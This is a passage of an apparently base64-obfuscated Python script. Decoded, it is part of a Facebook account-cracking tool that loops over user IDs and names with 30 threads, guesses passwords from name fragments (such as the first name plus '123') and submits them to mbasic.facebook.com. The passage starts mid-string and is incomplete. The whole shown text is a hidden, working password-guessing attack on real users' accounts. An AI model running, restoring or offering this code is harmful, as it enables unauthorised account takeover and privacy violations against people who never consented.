gICAgICAgICB3aXRoIEJBQlloZWFsdGgobWF4X3dvcmtlcnM9MzApIGFzIGhlYWx0aHdvcmxkOg0KICAgICAgICAgICAgICAgIGZvciB6c2IgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQ0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgeHogPSBuYW1lLnNwbGl0KCcgJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih4eikgPT0gMyBvciBsZW4oeHopID09IDQgb3IgbGVuKHh6KSA9PSA1IG9yIGxlbih4eikgPT0gNjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgaGVhbHRod29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgaGFzaWwob2ssY3ApDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgnXG4gU2VsZWN0IFZhbGlkIE9uZScpDQogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkNCg0KY2xhc3MgbG9hZDoNCiAgICBkZWYgX19pbml0X18oc2VsZik6DQogICAgICAgIF8gPSAnJw0KICAgICAgICBfXyA9IGludCgnMzAnKQ0KICAgICAgICBfX18gPSBpbnQoJzAnKQ0KICAgICAgICBfXyAtPSAxDQogICAgICAgIF9fXyArPSAxDQogICAgICAgIGZvciB0IGluIHJhbmdlKGludCgiMSIpKToNCiAgICAgICAgICAgIHByaW50KCdcciBQbGVhc2UgV2FpdCAuLi4uJykNCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCgwLjEpDQogICAgICAgIHByaW50KCdcbicpDQoNCkJBQlkoKQ=='))